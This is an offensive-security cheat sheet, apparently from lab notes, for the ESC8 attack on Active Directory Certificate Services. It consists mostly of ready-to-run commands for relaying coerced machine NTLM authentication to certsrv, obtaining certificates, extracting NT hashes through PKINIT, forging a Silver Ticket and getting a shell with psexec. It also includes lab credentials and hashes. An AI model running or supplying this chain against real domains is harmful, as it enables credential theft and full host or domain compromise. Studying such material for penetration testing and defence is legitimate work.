# 12.02 ADCS Relay ESC8 HTTP

> Relay machine-account NTLM to `http://CA/certsrv/certfnsh.asp` for a client-auth cert — DC certs unlock DCSync via `certipy auth`.

## Overview

ESC8 is NTLM relay to AD CS HTTP web enrollment (certsrv). Relay any machine account's SMB NTLM authentication to http://CA/certsrv/certfnsh.asp to obtain a certificate. Chain with PKINITtools (gettgtpkinit + getnthash) and ticketer.py to forge a Silver Ticket, or use certipy relay + certipy auth for a direct NT hash. HTTP does not enforce signing so SMB-to-HTTP relay is always viable.

## Steps

- Enumerate CA with nxc -M adcs; confirm certsrv NTLM via curl -I
- Run certipy find -enabled to confirm ESC8 vulnerability flag
- Method A (ntlmrelayx): --adcs --template Machine; coerce target with printerbug; base64 decode cert; gettgtpkinit → getnthash → lookupsid → ticketer.py → psexec
- Method B (certipy): certipy relay -target http://CA -template Machine; coerce with printerbug; certipy auth -pfx to get NT hash
- DomainController template required when coercing a DC itself
- Use FQDN (not IP) with Kerberos tools

## Commands

### Enumerate AD CS

```bash
nxc ldap 172.16.117.0/24 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -M adcs
```

### Certipy find

```bash
certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout
```

### Confirm NTLM on certsrv

```bash
curl -I http://172.16.117.3/certsrv/
```

### ntlmrelayx ESC8

```bash
sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

### Coerce WS01 for ESC8

```bash
python3 printerbug.py <DOMAIN>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
```

### Decode cert to PFX

```bash
echo -n "MIIRPQIBAzCC<SNIP>==" | base64 -d > ws01.pfx
```

### gettgtpkinit

```bash
python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx '<DOMAIN>.LOCAL/WS01$' ws01.ccache
```

### getnthash

```bash
KRB5CCNAME=ws01.ccache python3 getnthash.py '<DOMAIN>.LOCAL/WS01$' -key 917ec3b9d13dfb69e42ee05e09a5bf4ac4e52b7b677f1b22412e4deba644ebb2
```

### lookupsid for domain SID

```bash
lookupsid.py '<DOMAIN>.LOCAL/WS01$'@172.16.117.3 -hashes :3d3a72af94548ebc7755287a88476460
```

### Forge silver ticket

```bash
ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain <DOMAIN>.local -spn cifs/ws01.<DOMAIN>.local Administrator
```

### psexec with silver ticket

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.<DOMAIN>.local
```

### certipy relay ESC8

```bash
sudo certipy relay -target "http://172.16.117.3" -template Machine
```

### certipy auth (get NT hash)

```bash
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```
